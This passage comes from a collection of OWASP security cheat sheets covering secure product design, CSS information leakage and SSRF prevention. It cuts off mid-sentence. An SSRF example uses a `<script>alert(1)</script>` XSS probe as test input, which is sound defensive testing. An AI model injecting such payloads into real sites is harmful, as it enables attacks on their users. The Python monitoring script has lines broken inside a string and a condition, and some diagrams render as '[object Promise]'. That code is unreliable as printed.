offerings are considered what type of service (Ex: IaaS vs PaaS). Developers should look to understand the model which applies to the specific tool they are using.*\r\n\r\n#### Update Strategy for Self-managed Services\r\n\r\nSelf-managed tooling will require additional overhead by developers and support engineers. Depending on the tool, basic version updates, upgrades to images like [AMIs](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AMIs.html) or [Compute Images](https://cloud.google.com/compute/docs/images), or other operating system level maintence will be required. Use automation to regularly update minor versions or [images](https://docs.aws.amazon.com/systems-manager/latest/userguide/automation-tutorial-update-patch-golden-ami.html), and schedule time in development cycles for refreshing stale resources.\r\n\r\n#### Avoid Gaps in Managed Service Security\r\n\r\nManaged services will offer some level of security, like updating and securing the underlying hardware which runs application code. However, the development team are still responsible for many aspects of security in the system. Ensure developers understand what security will be their responsibility based on tool selection. Likely the following will be partially or wholly the responsibility of the developer:\r\n\r\n- Authentication and authorization\r\n- Logging and monitoring\r\n- Code security ([OWASP Top 10](https://owasp.org/www-project-top-ten/))\r\n- Third-party library patching\r\n\r\nUse documentation from the cloud provider to understand which security will be the responsbility of what party. Examples of this research for serverless functions:\r\n\r\n- [AWS Lambda](https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html)\r\n- [GCP Cloud Functions](https://cloud.google.com/functions/docs/securing)\r\n- [Azure Functions](https://learn.microsoft.com/en-us/azure/architecture/serverless-quest/functions-app-security)\r\n\r\n## References\r\n\r\n- [Secure Product Design](https://cheatsheetseries.owasp.org/cheatsheets/Secure_Product_Design_Cheat_Sheet.html)\r\n- [CISA Security Technical Reference Architecture](https://www.cisa.gov/sites/default/files/publications/Cloud%20Security%20Technical%20Reference%20Architecture.pdf)\r\n"
    },
    {
      "Secure_Product_Design_Cheat_Sheet.md": "# Secure Product Design Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe purpose of Secure Product Design is to ensure that all products meet or exceed the security requirements laid down by the organization as part of the development lifecycle and to ensure that all security decisions made about the product being developed are explicit choices and result in the correct level of security for the product being developed.\r\n\r\n## Methodology\r\n\r\nAs a basic start, establish secure defaults, minimise the attack surface area, and fail securely to those well-defined and understood defaults.\r\n\r\nSecure Product Design comes about through two processes:\r\n\r\n1. **_Product Inception_**; and\r\n2. **_Product Design_**\r\n\r\nThe first process happens when a product is conceived, or when an existing product is being re-invented. The latter is continuous, evolutionary, and done in an agile way, close to where the code is being written.\r\n\r\n## Security Principles\r\n\r\n### 1. The principle of Least Privilege and Separation of Duties\r\n\r\nLeast Privilege is a security principle that states that users should only be given the minimum amount of access necessary to perform their job. This means that users should only be given access to the resources they need to do their job, and no more. This helps to reduce the risk of unauthorized access to sensitive data or systems, as users are only able to access the resources they need. Least Privilege is an important security principle that should be followed in order to ensure the security of an organization's data and systems.\r\n\r\nSeparation of duties is a fundamental principle of internal control in business and organizations. It is a system of checks and balances that ensures that no single individual has control over all aspects of a transaction. This is done by assigning different tasks to different people, so that no one person has control over the entire process. This helps to reduce the risk of fraud and errors, as well as ensuring that all tasks are completed in a timely manner. Separation of duties is an important part of any organization's internal control system, and is essential for maintaining the integrity of the organization's financial records.\r\n\r\n### 2. The principle of Defense-in-Depth\r\n\r\nThe principle of Defense-in-Depth is a security strategy that involves multiple layers of security controls to protect an organization’s assets. It is based on the idea that if one layer of security fails, the other layers will still be able to protect the asset. The layers of security can include physical security, network security, application security, and data security. The goal of Defense-in-Depth is to create a secure environment that is resilient to attack and can quickly detect and respond to any security incidents. By implementing multiple layers of security, organizations can reduce the risk of a successful attack and minimize the damage caused by any successful attack.\r\n\r\n### 3. The principle of Zero Trust\r\n\r\nZero Trust is a security model that assumes that all users, devices, and networks are untrusted and must be verified before access is granted. It is based on the idea that organizations should not trust any user, device, or network, even if they are inside the organization’s network. Instead, all requests for access must be authenticated and authorized before access is granted. Zero Trust also requires organizations to continuously monitor and audit user activity to ensure that access is only granted to those who need it. This model is designed to reduce the risk of data breaches and other security incidents by ensuring that only authorized users have access to sensitive data.\r\n\r\n### 4. The principle of Security-in-the-Open\r\n\r\nSecurity-in-the-Open is a concept that emphasizes the importance of security in open source software development. It focuses on the need for developers to be aware of the security implications of their code and to take steps to ensure that their code is secure. This includes using secure coding practices, testing for vulnerabilities, and using secure development tools. Security-in-the-Open also encourages developers to collaborate with security experts to ensure that their code is secure.\r\n\r\n## Security Focus Areas\r\n\r\n### 1. Context\r\n\r\nWhere does this application under consideration fit into the ecosystem of the organization, which departments use it and for what reason? What kinds of data might it contain, and what is the risk profile as a result?\r\n\r\nThe processes employed to build the security context for an application include [Threat Modeling](Threat_Modeling_Cheat_Sheet.md) - which results in security related stories being added during **_Product Design_** at every iteration of *product delivery* - and when performing a Business Impact Assessment - which results in setting the correct Product Security Levels for a given product during **_Product Inception_**.\r\n\r\nContext is all important because over-engineering for security can have even greater cost implications than over-engineering for scale or performance, but under-engineering can have devastating consequences too.\r\n\r\n### 2. Components\r\n\r\nFrom libraries in use by the application (selected during any **_Product Design_** stage) through to external services it might make use of (changing of which happen during **_Product Inception_**), what makes up this application and how are those parts kept secure? In order to do this we leverage a library of secure design patterns and ready to use components defined in your Golden Path / Paved Road documentation and by analyzing those choices through [Threat Modeling](Threat_Modeling_Cheat_Sheet.md).\r\n\r\nA part of this component review must also include the more commercial aspects of selecting the right components (licensing and maintenance) as well as the limits on usage that might be required.\r\n\r\n### 3. Connections\r\n\r\nHow do you interact with this application and how does it connect to those components and services mentioned before? Where is the data stored and how is it accessed? Connections can also describe any intentional lack of connections. Think about the segregation of tiers that might be required depending on the Product Security Levels required and the potential segregation of data or whole environments if required for different tenants.\r\n\r\nAdding (or removing) connections is probably a sign that **_Product Inception_** is happening.\r\n\r\n### 4. Code\r\n\r\nCode is the ultimate expression of the intention for a product and as such it must be functional first and foremost. But there is a quality to how that functionality is provided that must meet or exceed the expectations of it.\r\n\r\nSome basics of secure coding include:\r\n\r\n   1. Input validation: Verify that all input data is valid and of the expected type, format, and length before processing it. This can help prevent attacks such as SQL injection and buffer overflows.\r\n   2. Error handling: Handle errors and exceptions in a secure manner, such as by logging them in a secure way and not disclosing sensitive information to an attacker.\r\n   3. Authentication and Authorization: Implement strong authentication and authorization mechanisms to ensure that only authorized users can access sensitive data and resources.\r\n   4. Cryptography: Use cryptographic functions and protocols to protect data in transit and at rest, such as HTTPS and encryption - the expected levels for a given Product Security Level can often be found by reviewing your Golden Path / Paved Road documentation.\r\n   5. Least privilege: Use the principle of the least privilege when writing code, such that the code and the system it runs on are given the minimum access rights necessary to perform their functions.\r\n   6. Secure memory management: Use high-level languages recommended in your Golden Path / Paved Road documentation or properly manage memory to prevent memory-related vulnerabilities such as buffer overflows and use-after-free.\r\n   7. Avoiding hardcoded secrets: Hardcoded secrets such as passwords and encryption keys should be avoided in the code and should be stored in a secure storage.\r\n   8. Security testing: Test the software for security vulnerabilities during development and just prior to deployment.\r\n   9. Auditing and reviewing the code: Regularly audit and review the code for security vulnerabilities, such as by using automated tools or having a third party review the code.\r\n   10. Keeping up-to-date: Keep the code up-to-date with the latest security best practices and vulnerability fixes to ensure that the software is as secure as possible.\r\n\r\nEnsure that you integrate plausibility checks at each tier of your application (e.g., from frontend to backend) and ensure that you write unit and integration tests to validate that all threats discovered during [Threat Modeling](Threat_Modeling_Cheat_Sheet.md) have been mitigated to a level of risk acceptable to the organization. Use that to compile use-cases and [abuse-cases](Abuse_Case_Cheat_Sheet.md) for each tier of your application.\r\n\r\n### 5. Configuration\r\n\r\nBuilding an application securely can all too easily be undone if it's not securely configured. At a minimum we should ensure the following:\r\n\r\n1. Bearing in mind the principle of Least Privilege: Limit the access and permissions of system components and users to the minimum required to perform their tasks.\r\n2. Remembering Defense-in-Depth: Implement multiple layers of security controls to protect against a wide range of threats.\r\n3. Ensuring Secure by Default: Configure systems and software to be secure by default, with minimal manual setup or configuration required.\r\n4. Secure Data: Protect sensitive data, such as personal information and financial data, by encrypting it in transit and at rest. Protecting that data also means ensuring it's correctly backed up and that the data retention is set correctly for the desired Product Security Level.\r\n5. Plan to have the configuration Fail Securely: Design systems to fail in a secure state, rather than exposing vulnerabilities when they malfunction.\r\n6. Always use Secure Communications: Use secure protocols for communication, such as HTTPS, to protect against eavesdropping and tampering.\r\n7. Perform regular updates - or leverage [maintained images](https://www.cisecurity.org/cis-hardened-images): Keeping software, docker images and base operating systems up-to-date with the [latest security patches](https://csrc.nist.gov/publications/detail/sp/800-40/rev-4/final) is an essential part of maintaining a secure system.\r\n8. Have a practiced Security Incident response plan: Having a plan in place for how to respond to a security incident is essential for minimizing the damage caused by any successful attack and a crucial part of the Product Support Model.\r\n\r\nDetails of how to precisely ensure secure configuration can be found in [Infrastructure as Code Security Cheat Sheet](Infrastructure_as_Code_Security_Cheat_Sheet.md)\r\n"
    },
    {
      "Securing_Cascading_Style_Sheets_Cheat_Sheet.md": "# Securing Cascading Style Sheets Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe goal of this `CSS` (Not [XSS](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), but [Cascading Style Sheet](https://www.w3schools.com/css/css_intro.asp)) Cheat Sheet is to inform Programmers, Testers, Security Analysts, Front-End Developers and anyone who is interested in Web Application Security to use these recommendations or requirements in order to achieve better security when authoring `Cascading Style Sheets`.\r\n\r\nLet's demonstrate this risk with an example:\r\n\r\nSanthosh is a programmer who works for a company called **X** and authors a Cascading Style Sheet to implement styling of the web application. The application for which he is writing CSS Code has various roles like **Student**, **Teacher**, **Super User** & **Administrator** and these roles have different permissions (PBAC - [Permission Based Access Control](Access_Control_Cheat_Sheet.md)) and Roles (RBAC - [Role Based Access Control](Access_Control_Cheat_Sheet.md)). Not only do these roles have different access controls, but these roles could also have different styling for webpages that might be specific to an individual or group of roles.\r\n\r\nSanthosh thinks that it would a great optimized idea to create a \"global styling\" CSS file which has all the CSS styling/selectors for all of the roles. According to their role, a specific feature or user interface element will be rendered. For instance, Administrator will have different features compared to **Student** or **Teacher** or **SuperUser**. However, some permissions or features maybe common to some roles.\r\n\r\nExample: Profile Settings will be applicable to all the users here while *Adding Users* or *Deleting Users* is only applicable for **Administrator**.\r\n\r\nExample:\r\n\r\n- `.login`\r\n- `.profileStudent`\r\n- `.changePassword`\r\n- `.addUsers`\r\n- `.deleteUsers`\r\n- `.addNewAdmin`\r\n- `.deleteAdmin`\r\n- `.exportUserData`\r\n- `.exportProfileData`\r\n- ...\r\n\r\nNow, let's examine what are the risks associated with this style of coding.\r\n\r\n### Risk \\#1\r\n\r\nMotivated Attackers always take a look at `*.CSS` files to learn the features of the application even without being logged in.\r\n\r\nFor instance: Jim is a motivated attacker and always tries to look into CSS files from the View-Source even before other attacks. When Jim looks into the CSS file, they see that there are different features and different roles based on the CSS selectors like `.profileSettings,` `.editUser,` `.addUser,` `.deleteUser` and so on. Jim can use the CSS for intel gathering to help gain access to sensitive roles. This is a form of attacker due diligence even before trying to perform dangerous attacks to gain access to the web application.\r\n\r\nIn a nutshell, having global styling could reveal sensitive information that could be beneficial to the attacker.\r\n\r\n### Risk \\#2\r\n\r\nLet's say, Santhosh has this habit of writing the descriptive selector names like `.profileSettings,` `exportUserData,` `.changePassword,` `.oldPassword,` `.newPassword,` `.confirmNewPassword` etc. Good programmers like to keep code readable and usable by other Code Reviewers of the team. The risk is that attackers could map these selectors to actual features of a web application.\r\n\r\n## Defensive Mechanisms to Mitigate Attacker's Motivation\r\n\r\n### Defense Mechanism \\#1\r\n\r\nAs a CSS Coder / Programmer, always keep the CSS isolated by access control level. By this, it means **Student** will have a different CSS file called as `StudentStyling.CSS` while **Administrator** has `AdministratorStyling.CSS` and so on. Make sure these `*.CSS` files are accessed only for a user with the proper access control level. Only users with the proper access control level should be able to access their `*.CSS` file.\r\n\r\nIf an authenticated user with the **Student** Role tries to access `AdministratorStyling.CSS` through forced browsing, an alert that an intrusion is occurring should be recorded.\r\n\r\n### Defense Mechanism \\#2\r\n\r\nAnother option is to modify your CSS files to remove any identifying information. As a general rule, it's recommended that your website have a consistent style between pages, and it's best to write your general CSS rules in such a way that they apply across multiple pages. This reduces the need for specific selectors in the first place. Furthermore, it's often possible to create CSS selectors that target specific HTML elements without using IDs or class names. For example, `#UserPage .Toolbar .addUserButton` could be rewritten to something more obscure such as `#page_u header button:first-of-type`.\r\n\r\nBuild-time and runtime tools also exist, which can be integrated to obfuscate your class names. This can reduce the chance of an attacker guessing the features of your application. Some examples:\r\n\r\n- [JSS](https://cssinjs.org) (CSS in JS) has a `minify` option which would generate class names such as `.c001`, `.c002`.\r\n- [CSS Modules](https://github.com/css-modules/css-modules) has a `modules` and `localIdentName` option, which functions similarly to JSS, but allows importing any CSS file without major structural changes to your application.\r\n- [.Net Blazor CSS Isolation](https://learn.microsoft.com/en-us/aspnet/core/blazor/components/css-isolation) can be used to scope your CSS to the component it's used in, and results in selectors like `button.add[b-3xxtam6d07]`.\r\n- CSS libraries such as [Bootstrap](https://getbootstrap.com) and [Tailwind](https://tailwindcss.com) can reduce the need for specific CSS selectors as they provide a strong base theme to work from.\r\n\r\n### Defense Mechanism \\#3\r\n\r\nWeb applications that allow users to author content via HTML input could be vulnerable to malicious use of CSS. Uploaded HTML could use styles that are allowed by the web application but could be used for purposes other than intended which could lead to security risks.\r\n\r\nExample: You can read about how [LinkedIn](https://www.scmagazine.com/news/vulnerability-management/style-sheet-vulnerability-allowed-attacker-to-hijack-linkedin-pages) had a vulnerability which allowed malicious use of CSS to execute a [Clickjacking](https://owasp.org/www-community/attacks/Clickjacking) attack. This caused the document to enter a state where clicking anywhere on the page would result in loading a potentially malicious website. You can read more about mitigating clickjacking attacks [here](Clickjacking_Defense_Cheat_Sheet.md).\r\n"
    },
    {
      "Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md": "# Server-Side Request Forgery Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe objective of the cheat sheet is to provide advices regarding the protection against [Server Side Request Forgery](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/) (SSRF) attack.\r\n\r\nThis cheat sheet will focus on the defensive point of view and will not explain how to perform this attack. This [talk](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf) from the security researcher [Orange Tsai](https://twitter.com/orange_8361) as well as this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf) provide techniques on how to perform this kind of attack.\r\n\r\n## Context\r\n\r\nSSRF is an attack vector that abuses an application to interact with the internal/external network or the machine itself. One of the enablers for this vector is the mishandling of URLs, as showcased in the following examples:\r\n\r\n- Image on an external server (*e.g.* user enters image URL of their avatar for the application to download and use).\r\n- Custom [WebHook](https://en.wikipedia.org/wiki/Webhook) (users have to specify Webhook handlers or Callback URLs).\r\n- Internal requests to interact with another service to serve a specific functionality. Most of the times, user data is sent along to be processed, and if poorly handled, can perform specific injection attacks.\r\n\r\n## Overview of a SSRF common flow\r\n\r\n[object Promise]\r\n\r\n*Notes:*\r\n\r\n- SSRF is not limited to the HTTP protocol. Generally, the first request is HTTP, but in cases where the application itself performs the second request, it could use different protocols (*e.g.* FTP, SMB, SMTP, etc.) and schemes (*e.g.* `file://`, `phar://`, `gopher://`, `data://`, `dict://`, etc.).\r\n- If the application is vulnerable to [XML eXternal Entity (XXE) injection](https://portswigger.net/web-security/xxe) then it can be exploited to perform a [SSRF attack](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks), take a look at the [XXE cheat sheet](XML_External_Entity_Prevention_Cheat_Sheet.md) to learn how to prevent the exposure to XXE.\r\n\r\n## Cases\r\n\r\nDepending on the application's functionality and requirements, there are two basic cases in which SSRF can happen:\r\n\r\n- Application can send request only to **identified and trusted applications**: Case when [allow listing](https://en.wikipedia.org/wiki/Whitelisting) approach is available.\r\n- Application can send requests to **ANY external IP address or domain name**: Case when [allow listing](https://en.wikipedia.org/wiki/Whitelisting) approach is unavailable.\r\n\r\nBecause these two cases are very different, this cheat sheet will describe defences against them separately.\r\n\r\n### Case 1 - Application can send request only to identified and trusted applications\r\n\r\nSometimes, an application needs to perform a request to another application, often located on another network, to perform a specific task. Depending on the business case, user input is required for the functionality to work.\r\n\r\n#### Example\r\n\r\n > Take the example of a web application that receives and uses personal information from a user, such as their first name, last name, birth date etc. to create a profile in an internal HR system. By design, that web application will have to communicate using a protocol that the HR system understands to process that data.\r\n > Basically, the user cannot reach the HR system directly, but, if the web application in charge of receiving user information is vulnerable to SSRF, the user can leverage it to access the HR system.\r\n > The user leverages the web application as a proxy to the HR system.\r\n\r\nThe allow list approach is a viable option since the internal application called by the *VulnerableApplication* is clearly identified in the technical/business flow. It can be stated that the required calls will only be targeted between those identified and trusted applications.\r\n\r\n#### Available protections\r\n\r\nSeveral protective measures are possible at the **Application** and **Network** layers. To apply the **defense in depth** principle, both layers will be hardened against such attacks.\r\n\r\n##### Application layer\r\n\r\nThe first level of protection that comes to mind is [Input validation](Input_Validation_Cheat_Sheet.md).\r\n\r\nBased on that point, the following question comes to mind: *How to perform this input validation?*\r\n\r\nAs [Orange Tsai](https://twitter.com/orange_8361) shows in his [talk](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf), depending on the programming language used, parsers can be abused. One possible countermeasure is to apply the [allow list approach](Input_Validation_Cheat_Sheet.md#allow-list-vs-block-list) when input validation is used because, most of the time, the format of the information expected from the user is globally known.\r\n\r\nThe request sent to the internal application will be based on the following information:\r\n\r\n- String containing business data.\r\n- IP address (V4 or V6).\r\n- Domain name.\r\n- URL.\r\n\r\n**Note:** Disable the support for the following of the [redirection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections) in your web client in order to prevent the bypass of the input validation described in the section `Exploitation tricks > Bypassing restrictions > Input validation > Unsafe redirect` of this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf).\r\n\r\n###### String\r\n\r\nIn the context of SSRF, validations can be added to ensure that the input string respects the business/technical format expected.\r\n\r\nA [regex](https://www.regular-expressions.info/) can be used to ensure that data received is valid from a security point of view if the input data have a simple format (*e.g.* token, zip code, etc.). Otherwise, validation should be conducted using the libraries available from the `string` object because regex for complex formats are difficult to maintain and are highly error-prone.\r\n\r\nUser input is assumed to be non-network related and consists of the user's personal information.\r\n\r\nExample:\r\n\r\n```java\r\n//Regex validation for a data having a simple format\r\nif(Pattern.matches(\"[a-zA-Z0-9\\\\s\\\\-]{1,50}\", userInput)){\r\n    //Continue the processing because the input data is valid\r\n}else{\r\n    //Stop the processing and reject the request\r\n}\r\n```\r\n\r\n###### IP address\r\n\r\nIn the context of SSRF, there are 2 possible validations to perform:\r\n\r\n1. Ensure that the data provided is a valid IP V4 or V6 address.\r\n2. Ensure that the IP address provided belongs to one of the IP addresses of the identified and trusted applications.\r\n\r\nThe first layer of validation can be applied using libraries that ensure the security of the IP address format, based on the technology used (library option is proposed here to delegate the managing of the IP address format and leverage battle-tested validation function):\r\n\r\n> Verification of the proposed libraries has been performed regarding the exposure to bypasses (Hex, Octal, Dword, URL and Mixed encoding) described in this [article](https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b).\r\n\r\n- **JAVA:** Method [InetAddressValidator.isValid](http://commons.apache.org/proper/commons-validator/apidocs/org/apache/commons/validator/routines/InetAddressValidator.html#isValid(java.lang.String)) from the [Apache Commons Validator](http://commons.apache.org/proper/commons-validator/) library.\r\n    - **It is NOT exposed** to bypass using Hex, Octal, Dword, URL and Mixed encoding.\r\n- **.NET**: Method [IPAddress.TryParse](https://docs.microsoft.com/en-us/dotnet/api/system.net.ipaddress.tryparse?view=netframework-4.8) from the SDK.\r\n    - **It is exposed** to bypass using Hex, Octal, Dword and Mixed encoding but **NOT** the URL encoding.\r\n    - As allow listing is used here, any bypass tentative will be blocked during the comparison against the allowed list of IP addresses.\r\n- **JavaScript**: Library [ip-address](https://www.npmjs.com/package/ip-address).\r\n    - **It is NOT exposed** to bypass using Hex, Octal, Dword, URL and Mixed encoding.\r\n- **Ruby**: Class [IPAddr](https://ruby-doc.org/stdlib-2.0.0/libdoc/ipaddr/rdoc/IPAddr.html) from the SDK.\r\n    - **It is NOT exposed** to bypass using Hex, Octal, Dword, URL and Mixed encoding.\r\n\r\n> **Use the output value of the method/library as the IP address to compare against the allow list.**\r\n\r\nAfter ensuring the validity of the incoming IP address, the second layer of validation is applied. An allow list is created after determining all the IP addresses (v4 and v6 to avoid bypasses) of the identified and trusted applications. The valid IP is cross-checked with that list to ensure its communication with the internal application (string strict comparison with case sensitive).\r\n\r\n###### Domain name\r\n\r\nIn the attempt of validate domain names, it is apparent to do a DNS resolution to verify the existence of the domain. In general, it is not a bad idea, yet it opens up the application to attacks depending on the configuration used regarding the DNS servers used for the domain name resolution:\r\n\r\n- It can disclose information to external DNS resolvers.\r\n- It can be used by an attacker to bind a legit domain name to an internal IP address. See the section `Exploitation tricks > Bypassing restrictions > Input validation > DNS pinning` of this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf).\r\n- An attacker can use it to deliver a malicious payload to the internal DNS resolvers and the API (SDK or third-party) used by the application to handle the DNS communication and then, potentially, trigger a vulnerability in one of these components.\r\n\r\nIn the context of SSRF, there are two validations to perform:\r\n\r\n1. Ensure that the data provided is a valid domain name.\r\n2. Ensure that the domain name provided belongs to one of the domain names of the identified and trusted applications (the allow listing comes to action here).\r\n\r\nSimilar to the IP address validation, the first layer of validation can be applied using libraries that ensure the security of the domain name format, based on the technology used (library option is proposed here in order to delegate the managing of the domain name format and leverage battle tested validation function):\r\n\r\n> Verification of the proposed libraries has been performed to ensure that the proposed functions do not perform any DNS resolution query.\r\n\r\n- **JAVA:** Method [DomainValidator.isValid](https://commons.apache.org/proper/commons-validator/apidocs/org/apache/commons/validator/routines/DomainValidator.html#isValid(java.lang.String)) from the [Apache Commons Validator](http://commons.apache.org/proper/commons-validator/) library.\r\n- **.NET**: Method [Uri.CheckHostName](https://docs.microsoft.com/en-us/dotnet/api/system.uri.checkhostname?view=netframework-4.8) from the SDK.\r\n- **JavaScript**: Library [is-valid-domain](https://www.npmjs.com/package/is-valid-domain).\r\n- **Python**: Module [validators.domain](https://validators.readthedocs.io/en/latest/#module-validators.domain).\r\n- **Ruby**: No valid dedicated gem has been found.\r\n    - [domainator](https://github.com/mhuggins/domainator), [public_suffix](https://github.com/weppos/publicsuffix-ruby) and [addressable](https://github.com/sporkmonger/addressable) has been tested but unfortunately they all consider `<script>alert(1)</script>.owasp.org` as a valid domain name.\r\n    - This regex, taken from [here](https://stackoverflow.com/a/26987741), can be used: `^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\\.)*(xn--)?([a-z0-9][a-z0-9\\-]{0,60}|[a-z0-9-]{1,30}\\.[a-z]{2,})$`\r\n\r\nExample of execution of the proposed regex for Ruby:\r\n\r\n```ruby\r\ndomain_names = [\"owasp.org\",\"owasp-test.org\",\"doc-test.owasp.org\",\"doc.owasp.org\",\r\n                \"<script>alert(1)</script>\",\"<script>alert(1)</script>.owasp.org\"]\r\ndomain_names.each { |domain_name|\r\n    if ( domain_name =~ /^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\\.)*(xn--)?([a-z0-9][a-z0-9\\-]{0,60}|[a-z0-9-]{1,30}\\.[a-z]{2,})$/ )\r\n        puts \"[i] #{domain_name} is VALID\"\r\n    else\r\n        puts \"[!] #{domain_name} is INVALID\"\r\n    end\r\n}\r\n```\r\n\r\n```bash\r\n$ ruby test.rb\r\n[i] owasp.org is VALID\r\n[i] owasp-test.org is VALID\r\n[i] doc-test.owasp.org is VALID\r\n[i] doc.owasp.org is VALID\r\n[!] <script>alert(1)</script> is INVALID\r\n[!] <script>alert(1)</script>.owasp.org is INVALID\r\n```\r\n\r\nAfter ensuring the validity of the incoming domain name, the second layer of validation is applied:\r\n\r\n1. Build an allow list with all the domain names of every identified and trusted applications.\r\n2. Verify that the domain name received is part of this allow list (string strict comparison with case sensitive).\r\n\r\nUnfortunately here, the application is still vulnerable to the `DNS pinning` bypass mentioned in this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf). Indeed, a DNS resolution will be made when the business code will be executed. To address that issue, the following action must be taken in addition of the validation on the domain name:\r\n\r\n1. Ensure that the domains that are part of your organization are resolved by your internal DNS server first in the chains of DNS resolvers.\r\n2. Monitor the domains allow list in order to detect when any of them resolves to a/an:\r\n   - Local IP address (V4 + V6).\r\n   - Internal IP of your organization (expected to be in private IP ranges) for the domain that are not part of your organization.\r\n\r\nThe following Python3 script can be used, as a starting point, for the monitoring mentioned above:\r\n\r\n```python\r\n# Dependencies: pip install ipaddress dnspython\r\nimport ipaddress\r\nimport dns.resolver\r\n\r\n# Configure the allow list to check\r\nDOMAINS_ALLOWLIST = [\"owasp.org\", \"labslinux\"]\r\n\r\n# Configure the DNS resolver to use for all DNS queries\r\nDNS_RESOLVER = dns.resolver.Resolver()\r\nDNS_RESOLVER.nameservers = [\"1.1.1.1\"]\r\n\r\ndef verify_dns_records(domain, records, type):\r\n    \"\"\"\r\n    Verify if one of the DNS records resolve to a non public IP address.\r\n    Return a boolean indicating if any error has been detected.\r\n    \"\"\"\r\n    error_detected = False\r\n    if records is not None:\r\n        for record in records:\r\n            value = record.to_text().strip()\r\n            try:\r\n                ip = ipaddress.ip_address(value)\r\n                # See https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv4Address.is_global\r\n                if not ip.is_global:\r\n                    print(\"[!] DNS record type '%s' for domain name '%s' resolve to\r\n                    a non public IP address '%s'!\" % (type, domain, value))\r\n                    error_detected = True\r\n            except ValueError:\r\n                error_detected = True\r\n                print(\"[!] '%s' is not valid IP address!\" % value)\r\n    return error_detected\r\n\r\ndef check():\r\n    \"\"\"\r\n    Perform the check of the allow list of domains.\r\n    Return a boolean indicating if any error has been detected.\r\n    \"\"\"\r\n    error_detected = False\r\n    for domain in DOMAINS_ALLOWLIST:\r\n        # Get the IPs of the current domain\r\n        # See https://en.wikipedia.org/wiki/List_of_DNS_record_types\r\n        try:\r\n            # A = IPv4 address record\r\n            ip_v4_records = DNS_RESOLVER.query(domain, \"A\")\r\n        except Exception as e:\r\n            ip_v4_records = None\r\n            print(\"[i] Cannot get A record for domain '%s': %s\\n\" % (domain,e))\r\n        try:\r\n            # AAAA = IPv6 address record\r\n            ip_v6_records = DNS_RESOLVER.query(domain, \"AAAA\")\r\n        except Exception as e:\r\n            ip_v6_records = None\r\n            print(\"[i] Cannot get AAAA record for domain '%s': %s\\n\" % (domain,e))\r\n        # Verify the IPs obtained\r\n        if verify_dns_records(domain, ip_v4_records, \"A\")\r\n        or verify_dns_records(domain, ip_v6_records, \"AAAA\"):\r\n            error_detected = True\r\n    return error_detected\r\n\r\nif __name__== \"__main__\":\r\n    if check():\r\n        exit(1)\r\n    else:\r\n        exit(0)\r\n```\r\n\r\n###### URL\r\n\r\nDo not accept complete URLs from the user because URL are difficult to validate and the parser can be abused depending on the technology used as showcased by the following [talk](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf) of [Orange Tsai](https://twitter.com/orange_8361).\r\n\r\nIf network related information is really needed then only accept a valid IP address or domain name.\r\n\r\n##### Network layer\r\n\r\nThe objective of the Network layer security is to prevent the *VulnerableApplication* from performing calls to arbitrary applications. Only allowed *routes* will be available for this application in order to limit its network access to only those that it should communicate with.\r\n\r\nThe Firewall component, as a specific device or using the one provided within the operating system, will be used here to define the legitimate flows.\r\n\r\nIn the schema below, a Firewall component is leveraged to limit the application's access, and in turn, limit the impact of an application vulnerable to SSRF:\r\n\r\n[object Promise]\r\n\r\n[Network segregation](https://www.mwrinfosecurity.com/our-thinking/making-the-case-for-network-segregation) (see this set of [implementation advice](https://www.cyber.gov.au/acsc/view-all-content/publications/implementing-network-segmentation-and-segregation) can also be leveraged and **is highly recommended in order to block illegitimate calls directly at network level itself**.\r\n\r\n### Case 2 - Application can send requests to ANY external IP address or domain name\r\n\r\nThis case happens when a user can control a URL to an **External** resource and the application makes a request to this URL (e.g. in case of [WebHooks](https://en.wikipedia.org/wiki/Webhook)). Allow lists cannot be used here because the list of IPs/domains is often unknown upfront and is dynamically changing.\r\n\r\nIn this scenario, *External* refers to any IP that doesn't belong to the internal network, and should be reached by going over the public internet.\r\n\r\nThus, the call from the *Vulnerable Application*:\r\n\r\n- **Is NOT** targeting one of the IP/domain *located inside* the company's global network.\r\n- Uses a convention defined between the *VulnerableApplication* and the expected IP/domain in order to *prove* that the call has been legitimately initiated.\r\n\r\n#### Challenges in blocking URLs at application layer\r\n\r\nBased on the business requirements of the above mentioned applications, the allow list approach is not a valid solution. Despite knowing that the block-list approach is not an impenetrable wall, it is the best solution in this scenario. It is informing the application what it should **not** do.\r\n\r\nHere is why filtering URLs is hard at the Application layer:\r\n\r\n- It implies that the application must be able to detect, at the code level, that the provided IP (V4 + V6) is not part of the official [private networks ranges](https://en.wikipedia.org/wiki/Private_network) including also *localhost* and *IPv4/v6 Link-Local* addresses. Not every SDK provides a built-in feature for this kind of verification, and leaves the handling up to the developer to understand all of its pitfalls and possible values, which makes it a demanding task.\r\n- Same remark for domain name: The company must maintain a list of all internal domain names and provide a centralized service to allow an application to verify if a provided domain name is an internal one. For this verification, an internal DNS resolver can be queried by the application but this internal DNS resolver must not resolve external domain names.\r\n\r\n#### Available protections\r\n\r\nTaking into consideration the same assumption in the following [example](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#example) for the following sections.\r\n\r\n##### Application layer\r\n\r\nLike for the case 